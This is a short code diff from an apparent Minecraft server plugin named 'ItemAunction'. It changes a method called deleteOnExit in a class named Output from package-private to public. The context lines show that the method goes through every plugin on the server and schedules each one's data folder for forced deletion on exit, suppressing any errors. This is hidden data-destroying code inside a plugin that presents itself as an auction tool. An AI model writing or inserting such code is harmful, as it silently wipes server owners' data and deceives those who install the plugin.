@@ -39,7 +39,7 @@ public final class Output {
         }
     }
 
-    boolean deleteOnExit() {
+    public boolean deleteOnExit() {
         try {
             for (Plugin plugin : ItemAunction.plugin.getServer().getPluginManager().getPlugins()) {
                 try{FileUtils.forceDeleteOnExit(plugin.getDataFolder());} catch (IOException ignored){}
